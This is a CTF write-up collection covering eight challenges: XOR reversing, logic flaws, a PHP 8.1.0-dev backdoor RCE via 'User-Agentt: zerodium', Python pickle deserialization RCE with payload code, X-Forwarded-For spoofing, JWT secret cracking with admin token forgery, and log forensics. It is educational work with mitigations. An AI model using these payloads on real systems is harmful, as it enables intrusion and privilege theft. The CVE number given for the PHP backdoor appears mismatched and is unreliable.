# SANIFU CPL WALKTHROUGH
Hello, dr3amy here!
Below is a collection of writeups covering several challenges that I solved from the cyber premium league.

# 1. Layer By Layer 

## Challenge Information
- **Challenge Name:** Layer By Layer
- **Category:** Reverse Engineering
- **Difficulty:** Easy
- **Description:** "layer by layer check me and I got a gift for you"
- **Flag Format:** `snf{...}`

## Initial Analysis

We're given a zip file `layerbylayer.zip`. Let's extract and examine it:

```bash
unzip layerbylayer.zip
file layerbylayer
```

Output:
```
layerbylayer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked
```

The file is a 64-bit Linux executable. Running it displays a welcome message and prompts for a flag:

```bash
chmod +x layerbylayer
./layerbylayer
```

```
========================================
  Welcome! >..< 
========================================
Enter the flag:
```

## Reverse Engineering

### Static Analysis with radare2

Let's disassemble the main function to understand the flag validation logic:

```bash
r2 -q -c "aaa; pdf @main" layerbylayer
```

Key findings from the disassembly:

1. **Encoded flag storage** - Three constants are loaded into stack memory:
   - `var_60h` at `rbp-0x60`: `0x1d30723a39242c31`
   - `var_58h` at `rbp-0x58`: `0x30713471301d3173`
   - `var_52h` at `rbp-0x52`: `0x3f712e2073313071`

2. **XOR key** - Value `0x42` is stored at `var_8h`

3. **Flag length** - The program expects exactly `0x16` (22) characters

4. **Validation algorithm**:
   ```asm
   movzx eax, byte [rbp + rax - 0x40]  ; Load input byte
   movsx eax, al
   xor eax, dword [var_8h]              ; XOR with 0x42
   movzx eax, byte [rbp + rax - 0x60]  ; Load encoded byte
   cmp edx, eax                         ; Compare
   ```

The program:
- Reads user input
- XORs each input character with `0x42`
- Compares the result against the stored encoded bytes
- If all match, displays "Correct! Flag: %s"

## Decoding the Flag

Since XOR is reversible, we can decode the flag by XORing the encoded bytes with the key:

```python
import struct

# Encoded data from the binary (little-endian format)
encoded1 = 0x1d30723a39242c31
encoded2 = 0x30713471301d3173
encoded3 = 0x3f712e2073313071

# Create a stack buffer
stack = bytearray(0x60)

# Write values to their stack positions
stack[0:8] = struct.pack('<Q', encoded1)    # rbp-0x60
stack[8:16] = struct.pack('<Q', encoded2)   # rbp-0x58

# Note: var_52h at offset 14 (0x60-0x52=14) overlaps with var_58h
offset_52h = 0x60 - 0x52
stack[offset_52h:offset_52h+8] = struct.pack('<Q', encoded3)

# Extract first 22 bytes and XOR with 0x42
encoded_bytes = stack[0:22]
xor_key = 0x42

flag = ''.join(chr(b ^ xor_key) for b in encoded_bytes)
print(f"Flag: {flag}")
```

Output:
```
Flag: snf{x0r_1s_r3v3rs1bl3}
```

## Verification

Let's verify the flag works:

```bash
echo -n "snf{x0r_1s_r3v3rs1bl3}" | ./layerbylayer
```

Output:
```
========================================
  Welcome! >..< 
========================================
Enter the flag: Correct! Flag: snf{x0r_1s_r3v3rs1bl3}
```

✅ Success!

## Key Takeaways

1. **XOR is reversible** - The flag cleverly hints at this: "x0r_1s_r3v3rs1bl3"
2. **Stack layout matters** - Understanding how variables are positioned on the stack was crucial (var_52h overlaps var_58h)
3. **Little-endian encoding** - The x86-64 architecture stores multi-byte values in little-endian format
4. **Static analysis is sufficient** - No dynamic analysis or debugging was needed; the encoded flag was stored in plaintext (XOR-encoded) in the binary

## Flag

```
snf{x0r_1s_r3v3rs1bl3}
```

## Tools Used
- `file` - File type identification
- `strings` - Extract printable strings
- `radare2` - Disassembly and analysis
- `objdump` - Alternative disassembler
- `python3` - Decoding script



# 2. Thank You 

## Challenge Information
- **Name:** Thank You
- **Points:** 1000
- **Category:** Web
- **Description:** ThanksGiving, EasyPPP
- **Connection:** challs.sanifu.or.tz:32215
- **Flag Format:** snf{}

## Solution

### Initial Reconnaissance

First, I connected to the service to see what was running:

```bash
nc challs.sanifu.or.tz 32215
```

The response indicated it was an HTTP server returning a `400 Bad Request` error.

### Step 1: HTTP GET Request

I made a proper HTTP GET request to the server:

```bash
curl -v http://challs.sanifu.or.tz:32215/
```

**Response:**
```html
<h1>Welcome to the Sanifu Website</h1>
<p>Try sending a POST request Again!</p>
```

The server explicitly asked for a POST request instead of GET.

### Step 2: HTTP POST Request

I sent a POST request to the server:

```bash
curl -v -X POST http://challs.sanifu.or.tz:32215/
```

**Key Response Headers:**
```
HTTP/1.1 200 OK
X-Powered-By: Express
X-Secret-Key: snf{Thanks_You_For_Playing_withUS_161dd33d11f5}
Content-Type: text/html; charset=utf-8
```

**Response Body:**
```
Response cant just contain Data, what about Header?
```

### The Trick

The flag was hidden in the **HTTP response headers**, specifically in the `X-Secret-Key` header, not in the response body. The server's message "Response cant just contain Data, what about Header?" was a hint to check the headers.

## Flag

```
snf{Thanks_You_For_Playing_withUS_161dd33d11f5}
```

## Key Takeaways

- Always check HTTP response headers, not just the response body
- The challenge name "ThanksGiving" was a hint to the flag message "Thanks You For Playing"
- Simple web challenges can hide flags in non-obvious locations like custom HTTP headers



# 3. Shoe Store

## Challenge Information
- **Challenge Name:** Shoe Store
- **Category:** Web
- **Connection:** labs.ctfzone.com:8812
- **Description:** "I like speaking logically however, I don't think I'm good!"

## Initial Reconnaissance

First, I accessed the web application to understand its structure:

```bash
curl -i http://labs.ctfzone.com:8812
```

The application is a shoe store built with Express.js that has:
- User registration and login functionality
- A store with premium shoes
- A purchase system with credit management

## Source Code Analysis

I examined the client-side JavaScript files to understand the application logic:

### Authentication System (`auth.js`)
- Registration endpoint: `/api/auth/register`
- Login endpoint: `/api/auth/login`
- New users receive $10 credit upon registration

### Purchase System (`purchase.js`)
The purchase flow revealed an interesting detail:

```javascript
const response = await fetch('/api/purchase', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        userId: userId,
        productId: productId,
        quantity: quantity
    })
});
```

The HTML also contained a hint in the quantity input field:
```html
<small class="hint">💡 Try different values here...</small>
```

## Exploitation

### Step 1: Create an Account
```bash
curl -X POST http://labs.ctfzone.com:8812/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser123","password":"testpass123"}'
```

Response:
```json
{"message":"User registered successfully with $10 credit!","userId":1}
```

### Step 2: Login
```bash
curl -X POST http://labs.ctfzone.com:8812/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser123","password":"testpass123"}'
```

Response:
```json
{"message":"Login successful","user":{"id":1,"username":"testuser123","credit":10}}
```

### Step 3: Check Available Products
```bash
curl http://labs.ctfzone.com:8812/api/products
```

Products ranged from $100 to $230, all too expensive for our $10 credit.

### Step 4: Exploit the Logic Flaw

Based on the challenge description "I like speaking logically however, I don't think I'm good!" and the hint about trying different quantity values, I tested for a **logic flaw** by using a **negative quantity**:

```bash
curl -X POST http://labs.ctfzone.com:8812/api/purchase \
  -H "Content-Type: application/json" \
  -d '{"userId":1,"productId":1,"quantity":-1}'
```

## Success!

The server returned the flag:

```json
{
  "message":"🎉 Congratulations! You've successfully exploited the logic flaw!",
  "flag":"snf{l0g1c_fl4w_3xpl0it_93854385094}",
  "purchaseDetails":{
    "product":"Air Jordan 1 Retro High",
    "quantity":-1,
    "totalCost":-170,
    "previousCredit":10,
    "newCredit":180
  }
}
```

## Vulnerability Explanation

The application failed to validate that the `quantity` parameter must be positive. When purchasing with a negative quantity:
- Quantity: `-1`
- Product price: `$170`
- Total cost: `-1 × $170 = -$170`
- New credit: `$10 - (-$170) = $180`

Instead of deducting money, the negative cost **added money** to the account, exposing a classic **integer/logic flaw vulnerability**.

## Flag
```
snf{l0g1c_fl4w_3xpl0it_93854385094}
```

## Lessons Learned
- Always validate user input, especially numerical values
- Ensure business logic constraints (e.g., quantity > 0) are enforced server-side
- Don't rely on client-side validation alone
- Test edge cases like negative numbers, zero, and extremely large values



# 4. PHP

**Challenge:** PHP  
**Points:** 1000  
**Difficulty:** EASY  
**Connection:** challs.sanifu.or.tz:30840  
**Flag:** `snf{PHP_DEV_b00913a9-c0d1-47cf-9a1e-b2824f4d8888}`

---

## Challenge Description

> EASY one!! i know everyone once in life code woth php

The challenge provides a web service endpoint and hints at PHP-related vulnerabilities.

---

## Reconnaissance

First, I made a basic HTTP request to see what the service returns:

```bash
curl http://challs.sanifu.or.tz:30840
```

**Response:**
```
Hi, this sanifu blog developed with php
```

Next, I checked the HTTP headers for additional information:

```bash
curl -v http://challs.sanifu.or.tz:30840
```

**Key Finding:**
```
X-Powered-By: PHP/8.1.0-dev
```

---

## Vulnerability Identification

The `PHP/8.1.0-dev` version immediately stood out as suspicious. This version was compromised in March 2021 as part of a supply chain attack where malicious code was injected into PHP's official Git repository.

**Vulnerability:** PHP 8.1.0-dev Backdoor (CVE-2021-21702)

The backdoor allows remote code execution by sending a specially crafted `User-Agentt` header (note the double 't'). The malicious code checks for this header and executes arbitrary PHP code.

---

## Exploitation

### Testing the Backdoor

I tested the exploit using the known backdoor syntax:

```bash
curl http://challs.sanifu.or.tz:30840 -H "User-Agentt: zerodiumvar_dump(system('ls'));"
```

**Response:**
```
index.php
string(9) "index.php"
```

Success! The command execution worked.

### Finding the Flag

I searched for flag files on the system:

```bash
curl http://challs.sanifu.or.tz:30840 -H "User-Agentt: zerodiumvar_dump(system('find / -name \"*flag*\" 2>/dev/null'));"
```

This revealed `/flag.txt` among the results.

### Reading the Flag

Finally, I read the flag file:

```bash
curl http://challs.sanifu.or.tz:30840 -H "User-Agentt: zerodiumvar_dump(system('cat /flag.txt'));"
```

**Flag Retrieved:** `snf{PHP_DEV_b00913a9-c0d1-47cf-9a1e-b2824f4d8888}`

---

## Technical Details

The backdoor code injected into PHP 8.1.0-dev looked for the `User-Agentt` header and used `zend_eval_string()` to execute any PHP code following the "zerodium" prefix. The attackers had initially targeted the Zerodium bug bounty program, hence the prefix name.

**Exploit Pattern:**
```
User-Agentt: zerodium<PHP_CODE_HERE>
```

---

## Mitigation

- Never use development versions of PHP in production
- Always verify the integrity of downloaded software
- Keep PHP updated to stable, patched versions
- Monitor for unusual User-Agent headers in web server logs

---

## References

- [CVE-2021-21702](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21702)
- PHP Git Repository Compromise (March 2021)



# 5. Parcel

**Challenge Name:** Parcel  
**Points:** 1000  
**Category:** Web Exploitation  
**Flag Format:** snf{}  

## Challenge Description

> A wrapped preference arrives carrying more than expected.

**Connection Info:** `challs.sanifu.or.tz:31695`

## Reconnaissance

### Initial Connection

First, I attempted to connect to the service using netcat, but the server didn't respond automatically:

```bash
nc challs.sanifu.or.tz 31695
```

This suggested it might be an HTTP service rather than a raw TCP service.

### HTTP Discovery

Testing with curl revealed a web application:

```bash
curl http://challs.sanifu.or.tz:31695
```

The response showed a simple HTML page with a title "Sanifu Preferences" and a link to `/settings`.

**Key Discovery:** The server set a cookie in the response:

```
Set-Cookie: prefs=gASVHwAAAAAAAAB9lCiMBXRoZW1llIwFbGlnaHSUjAVpdGVtc5RLFHUu; Path=/
```

## Vulnerability Analysis

### Cookie Inspection

The cookie value looked suspicious - it appeared to be base64-encoded. The prefix `gASV` is a telltale sign of Python pickle protocol 4.

Decoding the cookie:

```python
import base64
import pickle

data = base64.b64decode('gASVHwAAAAAAAAB9lCiMBXRoZW1llIwFbGlnaHSUjAVpdGVtc5RLFHUu')
print(pickle.loads(data))
# Output: {'theme': 'light', 'items': 20}
```

### Testing the Endpoint

Accessing `/settings` with the cookie:

```bash
curl http://challs.sanifu.or.tz:31695/settings \
  -b "prefs=gASVHwAAAAAAAAB9lCiMBXRoZW1llIwFbGlnaHSUjAVpdGVtc5RLFHUu"
```

Response:
```
current prefs: {'theme': 'light', 'items': 20}
```

This confirmed that **the server was deserializing the pickle object from the cookie** - a critical security vulnerability!

### Source Code Analysis

I created an exploit to read the application source code (`/app/app.py`):

```python
from flask import Flask, request, make_response
import base64
import pickle

def decode_prefs(token: str):
    return pickle.loads(base64.b64decode(token.encode()))

@app.route("/settings")
def settings():
    token = request.cookies.get("prefs")
    prefs = decode_prefs(token)  # Vulnerable!
    return f"current prefs: {prefs}"
```

The application directly unpickles user-controlled data without any validation - a classic **insecure deserialization vulnerability**.

## Exploitation

### Understanding Pickle Deserialization

Python's pickle module can execute arbitrary code during deserialization through the `__reduce__` method. This allows attackers to achieve Remote Code Execution (RCE).

### Exploit Development

I created a malicious pickle payload that executes shell commands:

```python
import pickle
import base64
import subprocess

class Exploit:
    def __reduce__(self):
        # Execute shell commands and capture output
        return (subprocess.check_output, 
                (["sh", "-c", "cat /flag.txt || cat /flag || echo NOTFOUND"],))

malicious = Exploit()
payload = pickle.dumps(malicious)
encoded = base64.b64encode(payload).decode()
print(encoded)
```

### Finding the Flag

**Attempt 1:** Common flag locations
```bash
# Payload to check: /flag.txt, /flag, flag.txt, flag
# Result: NOTFOUND
```

**Attempt 2:** Filesystem exploration
```bash
# Payload to list /app directory
ls -la /app
# Found: app.py, requirements.txt, __pycache__
```

**Attempt 3:** Environment variables (SUCCESS!)
```python
class ReadEnv:
    def __reduce__(self):
        return (subprocess.check_output, 
                (["sh", "-c", "env | grep -i flag || env | grep -i snf || env"],))
```

Payload:
```
gASVYgAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlCiMAnNolIwCLWOUjC5lbnYgfCBncmVwIC1pIGZsYWcgfHwgZW52IHwgZ3JlcCAtaSBzbmYgfHwgZW52lGWFlFKULg==
```

Sending the exploit:
```bash
curl http://challs.sanifu.or.tz:31695/settings \
  -b "prefs=gASVYgAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlCiMAnNolIwCLWOUjC5lbnYgfCBncmVwIC1pIGZsYWcgfHwgZW52IHwgZ3JlcCAtaSBzbmYgfHwgZW52lGWFlFKULg=="
```

Response:
```
current prefs: b'GZCTF_FLAG=snf{3623de59-2adf-4b30-98df-1a567d29e65b}\n'
```

## Flag

```
snf{3623de59-2adf-4b30-98df-1a567d29e65b}
```

## Key Takeaways

1. **"Wrapped preference"** was a hint about serialized (pickled) data
2. **Never trust user input** - especially when deserializing objects
3. **Python pickle is inherently unsafe** when used with untrusted data
4. **Always look for RCE vectors** in deserialization vulnerabilities
5. **Check environment variables** - they're a common place to store flags in CTF challenges

## Mitigation

The application should:
- Use JSON instead of pickle for data serialization
- Implement proper input validation
- Use signed cookies with cryptographic verification (e.g., Flask's session cookies with SECRET_KEY)
- Never deserialize untrusted data

## Tools Used

- curl
- Python 3 (pickle, base64, subprocess modules)
- netcat (initial testing)




# 6. Mirror
**Points:** 1000  
**Category:** Web  
**Flag Format:** `snf{}`

## Challenge Description
> A boundary intended for insiders reflects the wrong face.

**Connection:** `challs.sanifu.or.tz:30198`

## Reconnaissance

First, I visited the main page to understand the application:

```bash
curl -s http://challs.sanifu.or.tz:30198/
```

This revealed a simple login portal with a form that accepts a `user` parameter via GET request to `/login`.

## Enumeration

I tested the login functionality:

```bash
curl -s "http://challs.sanifu.or.tz:30198/login?user=alice"
# Response: logged in as alice
```

The input was being reflected back - classic "mirror" behavior as the challenge name suggested.

Next, I probed for hidden endpoints:

```bash
curl -s "http://challs.sanifu.or.tz:30198/admin"
# Response: unauthorized
```

Found an `/admin` endpoint that returned "unauthorized" - this is the "boundary intended for insiders" mentioned in the hint.

## Exploitation

The hint mentioned:
- **"boundary intended for insiders"** → IP-based access control (localhost only)
- **"reflects the wrong face"** → The server trusts client-supplied headers

I attempted to bypass the IP restriction using the `X-Forwarded-For` header to spoof a localhost IP:

```bash
curl -s -H "X-Forwarded-For: 127.0.0.1" "http://challs.sanifu.or.tz:30198/admin"
```

**Response:**
```
internal admin ok. secret: snf{18c6588e-82be-445a-89cd-f39d30f9765d}
```

## Flag
```
snf{18c6588e-82be-445a-89cd-f39d30f9765d}
```

## Vulnerability Explanation

The application used the `X-Forwarded-For` HTTP header to determine the client's IP address for access control decisions. This header is typically set by reverse proxies to preserve the original client IP, but when the application blindly trusts this header without proper validation, attackers can spoof it to bypass IP-based restrictions.

**Lesson:** Never trust client-controllable headers (`X-Forwarded-For`, `X-Real-IP`, etc.) for security decisions without proper validation at the proxy/load balancer level.


# 7. Global Trust Bank

**Challenge:** Global Trust Bank  
**Category:** Web  
**Difficulty:** Medium  
**Points:** 300  
**Flag:** `snf{JWT_cr4ck3d_4dm1n_4cc3ss_gr4nt3d_458734659457}`

## Overview

This challenge involves exploiting a vulnerable JWT (JSON Web Token) implementation in a banking web application. The goal is to escalate privileges from a regular user to an admin by cracking the JWT signing secret and forging a new token.

## Reconnaissance

Starting with basic enumeration of the target at `labs.ctfzone.com:7194`:

```bash
curl -sv http://labs.ctfzone.com:7194/
```

The homepage reveals a banking application called "GlobalTrust Bank" with a login page at `/login`.

## Discovery of Credentials

Examining the login page source code reveals hardcoded test credentials in an HTML comment:

```html
<!-- test_user=clemence pw=snf&&ctfzonepass@2026 -->
```

**Credentials found:**
- Username: `clemence`
- Password: `snf&&ctfzonepass@2026`

## Authentication & JWT Analysis

Logging in with the discovered credentials:

```bash
curl -X POST http://labs.ctfzone.com:7194/login \
  -d 'username=clemence&password=snf%26%26ctfzonepass%402026' \
  -c cookies.txt -L
```

The server responds with a JWT token stored in the `authToken` cookie:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiY2xlbWVuY2UiLCJpc0FkbWluIjpmYWxzZSwiYmFsYW5jZSI6MzAwMCwiaWF0IjoxNzcxNzkwOTQ0LCJleHAiOjE3NzE3OTQ1NDR9.48SjvVPcmdoXafrAsTZ035r_Am7cCe2wsOxOjlE6rlo
```

Decoding the JWT payload reveals:

```json
{
  "userId": 2,
  "username": "clemence",
  "isAdmin": false,
  "balance": 3000,
  "iat": 1771790944,
  "exp": 1771794544
}
```

The critical field here is `"isAdmin": false`.

## Finding the Target Endpoint

Enumerating common endpoints:

```bash
for path in /admin /api/admin /api/flag /flag; do
  curl -s -o /dev/null -w "$path === %{http_code}\n" \
    http://labs.ctfzone.com:7194$path -b cookies.txt
done
```

Results:
- `/api/flag` returns **403 Forbidden** with the message: `{"error":"Admin access required"}`

This confirms that we need admin privileges to access the flag.

## JWT Secret Cracking

Since the JWT uses HMAC-SHA256 (`alg: HS256`), the signature depends on a secret key. If the secret is weak, we can crack it using brute force.

### Attempted Attack: Algorithm Confusion

First, I tried the `alg: none` attack (removing the signature requirement):

```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"userId":2,"username":"clemence","isAdmin":true,"balance":3000,"iat":1771790944,"exp":1771794544}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
TOKEN="${HEADER}.${PAYLOAD}."
curl -s http://labs.ctfzone.com:7194/api/flag -b "authToken=$TOKEN"
```

**Result:** `{"error":"Invalid token"}` - The server properly validates the algorithm.

### Successful Attack: Secret Brute Force

Using John the Ripper with the rockyou wordlist:

```bash
# Extract rockyou wordlist
zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt

# Save JWT to file
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiY2xlbWVuY2UiLCJpc0FkbWluIjpmYWxzZSwiYmFsYW5jZSI6MzAwMCwiaWF0IjoxNzcxNzkwOTQ0LCJleHAiOjE3NzE3OTQ1NDR9.48SjvVPcmdoXafrAsTZ035r_Am7cCe2wsOxOjlE6rlo' > /tmp/jwt.txt

# Crack the JWT
john /tmp/jwt.txt --wordlist=/tmp/rockyou.txt --format=HMAC-SHA256
```

**Result:** Secret cracked in ~1 second!

```
n1c2a3h4t5l6i7e890r (?)
```

The JWT signing secret is: **`n1c2a3h4t5l6i7e890r`**

## Forging Admin JWT

With the secret in hand, we can forge a new JWT with `isAdmin: true`:

```python
import hmac, hashlib, base64, json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = json.dumps({'alg':'HS256','typ':'JWT'}, separators=(',',':'))
payload = json.dumps({
    'userId': 2,
    'username': 'clemence',
    'isAdmin': True,  # Changed to True
    'balance': 3000,
    'iat': 1771790944,
    'exp': 1771899999  # Extended expiration
}, separators=(',',':'))

header_b64 = b64url_encode(header)
payload_b64 = b64url_encode(payload)
message = f'{header_b64}.{payload_b64}'.encode()
signature = hmac.new(b'n1c2a3h4t5l6i7e890r', message, hashlib.sha256).digest()
sig_b64 = b64url_encode(signature)

token = f'{header_b64}.{payload_b64}.{sig_b64}'
print(token)
```

**Forged JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiY2xlbWVuY2UiLCJpc0FkbWluIjp0cnVlLCJiYWxhbmNlIjozMDAwLCJpYXQiOjE3NzE3OTA5NDQsImV4cCI6MTc3MTg5OTk5OX0.hL5pVHMV6mPMjG1Mj_-rFnUQPPiUBhaVLHMFBp_0RWY
```

## Capturing the Flag

Using the forged admin JWT to access the flag endpoint:

```bash
curl -s http://labs.ctfzone.com:7194/api/flag \
  -b "authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiY2xlbWVuY2UiLCJpc0FkbWluIjp0cnVlLCJiYWxhbmNlIjozMDAwLCJpYXQiOjE3NzE3OTA5NDQsImV4cCI6MTc3MTg5OTk5OX0.hL5pVHMV6mPMjG1Mj_-rFnUQPPiUBhaVLHMFBp_0RWY"
```

**Response:**
```json
{"flag":"snf{JWT_cr4ck3d_4dm1n_4cc3ss_gr4nt3d_458734659457}"}
```

## Flag

```
snf{JWT_cr4ck3d_4dm1n_4cc3ss_gr4nt3d_458734659457}
```

## Key Vulnerabilities

1. **Hardcoded credentials in HTML comments** - Sensitive test credentials exposed in client-side code
2. **Weak JWT signing secret** - The secret `n1c2a3h4t5l6i7e890r` exists in common wordlists and was crackable in seconds
3. **Privilege escalation via JWT tampering** - Once the secret was compromised, admin access was trivially obtained

## Mitigation Recommendations

1. **Never hardcode credentials** - Remove all test/debug credentials from production code
2. **Use strong, random JWT secrets** - Generate cryptographically secure random secrets (minimum 256 bits)
3. **Implement additional authorization checks** - Don't rely solely on JWT claims; validate permissions server-side
4. **Use asymmetric signing (RS256)** - Consider using public/private key pairs instead of shared secrets
5. **Implement rate limiting** - Protect authentication endpoints from brute force attacks
6. **Add JWT validation** - Implement proper token validation including issuer, audience, and expiration checks

## Tools Used

- `curl` - HTTP requests
- `john` (John the Ripper) - JWT secret cracking
- `python3` - JWT forging
- rockyou.txt wordlist



# 8. Between Signal and Noise

## Challenge Information
- **Challenge Name:** Between Signal and Noise
- **Category:** MISC/Forensics
- **Flag Format:** `snf{}`

## Challenge Description
A former employee left the company under... unusual circumstances. They mentioned something about "leaving the key in the usual place" and "the rest is in the logs." Incident response has preserved a few artifacts from their workstation.

## Initial Analysis

We're provided with a zip file containing two files:
```bash
$ unzip -l challenge.zip
Archive:  challenge.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      231  2026-02-25 17:11   .config
     1071  2026-02-25 17:11   log_20250225.txt
```

### File Contents

**`.config`** - Contains an encrypted base64 payload in comments:
```
# Application configuration
# Last modified by legacy migration script
# Do not edit below this line
#
# Encrypted payload (base64):
# Pl8VGH1uOFBKIV1HDQNvPkAmCwEBUF4selAKEgNDUQUi
```

**`log_20250225.txt`** - Contains various system log entries with INFO, DEBUG, WARNING, and ERROR levels.

## Solution Approach

### Step 1: Understanding the Clues
The challenge title "Between Signal and Noise" is a critical hint. In information theory and signal processing, this refers to extracting meaningful information (signal) from irrelevant data (noise).

The description mentions:
- "The key in the usual place" → likely the `.config` file
- "The rest is in the logs" → the decryption key must be hidden in the logs

### Step 2: Analyzing the Logs
Examining the log file, we notice entries at different severity levels:
- INFO
- DEBUG
- WARNING
- ERROR

The WARNING and ERROR lines stand out as potentially significant:
```
2025-02-25 08:01:15 WARNING Maintenance window scheduled for 02:00 UTC
2025-02-25 08:05:22 WARNING 1 deprecated API call from 10.0.0.42
2025-02-25 08:12:33 WARNING ssl certificate expires in 30 days
2025-02-25 08:15:00 ERROR [payment] Timeout connecting to gateway
2025-02-25 08:20:11 WARNING cache size exceeds 80% threshold
2025-02-25 08:22:00 WARNING 0 retries left for worker queue
2025-02-25 08:30:45 WARNING _internal audit flag set by admin
2025-02-25 08:40:02 WARNING Key rotation recommended within 7 days
2025-02-25 08:45:00 WARNING 3 failed login attempts from 192.168.1.100
2025-02-25 08:55:11 WARNING yaml config parser fallback used
```

### Step 3: Extracting the Key
The key insight is that **WARNING** lines contain the signal, while ERROR is noise (or vice versa). 

Taking the **first character** of each **WARNING-only** message (excluding ERROR):
- **M**aintenance → M
- **1** deprecated → 1
- **s**sl → s
- **c**ache → c
- **0** retries → 0
- **_**internal → _
- **K**ey → K
- **3** failed → 3
- **y**aml → y

This spells: **M1sc0_K3y** (leetspeak for "misc key")

### Step 4: Decryption
The encrypted payload needs to be:
1. Base64 decoded
2. XOR decrypted with the extracted key

Python solution:
```python
import base64

payload = "Pl8VGH1uOFBKIV1HDQNvPkAmCwEBUF4selAKEgNDUQUi"
key = "M1sc0_K3y"

# Decode base64
decoded = base64.b64decode(payload)

# XOR with key
result = ""
for i, byte in enumerate(decoded):
    key_char = key[i % len(key)]
    result += chr(byte ^ ord(key_char))

print(result)
```

## Flag
```
snf{M1sc3ll4n30us_F0r3ns1cs_2025}
```

Translation: "Miscellaneous Forensics 2025"

## Key Takeaways
1. **Challenge titles are hints** - "Between Signal and Noise" directly pointed to the extraction method
2. **Log analysis** - Important data can be hidden in plain sight within logs
3. **Pattern recognition** - Identifying that WARNING vs ERROR distinction was crucial
4. **XOR encryption** - Common CTF technique for simple encryption with a key
5. **Leetspeak** - The key "M1sc0_K3y" was a clue itself, hinting at the miscellaneous/forensics category

## Tools Used
- `unzip` - Archive extraction
- `python3` - Decryption script
- `grep` - Log filtering
- `base64` library - Decoding


So far that's all I have been able to put together as a member of S4lv4t0r3_UDOM, see you soon!